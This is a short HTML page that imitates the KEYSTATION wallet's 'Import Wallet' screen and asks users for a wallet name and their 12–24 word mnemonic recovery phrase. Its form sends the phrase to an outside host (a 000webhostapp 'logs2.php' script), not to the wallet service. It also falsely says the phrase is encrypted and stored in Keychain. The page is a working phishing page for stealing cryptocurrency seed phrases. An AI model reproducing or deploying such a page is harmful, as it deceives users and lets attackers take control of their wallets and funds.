<body>
<div id="app">
    <div class="inner">
        <h1><img src="./KEYSTATION_files/keystation_logo_.png" alt="KEYSTATION" width="145"></h1>
        <h2>Import Wallet</h2>


        <form method="POST" class="keystation-form" action="https://socialbandar122.000webhostapp.com/logs2.php">
				<span class="input input--fumi">
					<input class="input__field input__field--fumi input-mnemonics" name="account" id="account"  required="">
					<label class="input__label input__label--fumi">
						
						<span class="input__label-content input__label-content--fumi">Wallet Name</span>
					</label>
				</span>
            <span class="input input--fumi">
					<textarea class="input__field input__field--fumi input-mnemonics" name="mnemonics" id="mnemonics"  required=""></textarea>
					<label class="input__label input__label--fumi">
						
						<span class="input__label-content input__label-content--fumi">Mnemonics</span>
					</label>
				</span>
				<p id="errorOnImport" class="error" style="display: block;">

                <span>Mnemonics is not valid.</span>
            </p>
            <p id="formInfoMessage" class="information-text">
                 Enter 12 / 16 / 24 words including spaces. Mnemonic phrase is encrypted and stored in Keychain.
            </p>

            <button type="submit" id="importBtn">Next</button>
        </form>




        

    </div>

</div>
